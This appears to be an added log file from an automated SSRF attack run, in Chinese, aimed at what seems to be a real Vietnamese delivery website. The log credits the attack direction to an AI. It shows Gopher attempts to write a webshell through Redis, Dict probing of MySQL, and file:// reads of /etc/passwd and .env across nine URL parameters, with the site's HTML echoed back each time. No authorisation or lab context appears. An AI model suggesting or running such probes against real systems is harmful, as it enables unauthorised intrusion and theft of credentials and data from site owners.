@@ -1,0 +1,246 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔥 v13.0 SSRF Gopher协议攻击（AI建议）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[*] AI判断: 之前HTTP SSRF有响应，但输出被过滤
+[*] 新方向: 用Gopher/Dict/File协议攻击内网服务
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[1] 测试Gopher攻击Redis（写WebShell）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  参数 url → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+  参数 proxy → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+  参数 link → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+  参数 uri → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+  参数 path → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+  参数 file → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+  参数 document → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+  参数 img → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+  参数 image → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[2] 测试Dict探测MySQL
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  参数 url → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+  参数 proxy → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+  参数 link → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+  参数 uri → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+  参数 path → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+  参数 file → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+  参数 document → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+  参数 img → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+  参数 image → ⚠️  有响应
+
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml" class="bg07" lang="vi">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>Giao hàng tiết kiệm | Giao hang Ha Noi | Giao hang va thu tien Ha Noi | Dich vu giao hang Ha Noi | Dich
+			vu
+			giao hang chuyen nghiep Ha Noi | Giao hang thu tien chuyen nghiep | Giai phap giao hang</title>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[3] 测试File协议读取敏感文件
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[*] 参数: url
+    file:///etc/passwd → ❌
+    file:///.env → ❌
+[*] 参数: proxy
+    file:///etc/passwd → ❌
+    file:///.env → ❌
+[*] 参数: link
+    file:///etc/passwd → ❌
+    file:///.env → ❌
+[*] 参数: uri
+    file:///etc/passwd → ❌
+    file:///.env → ❌
+[*] 参数: path
+    file:///etc/passwd → ❌
+    file:///.env → ❌
+[*] 参数: file
+    file:///etc/passwd → ❌
+    file:///.env → ❌
+[*] 参数: document
+    file:///etc/passwd → ❌
+    file:///.env → ❌
+[*] 参数: img
+    file:///etc/passwd → ❌
+    file:///.env → ❌
+[*] 参数: image
+    file:///etc/passwd → ❌
+    file:///.env → ❌
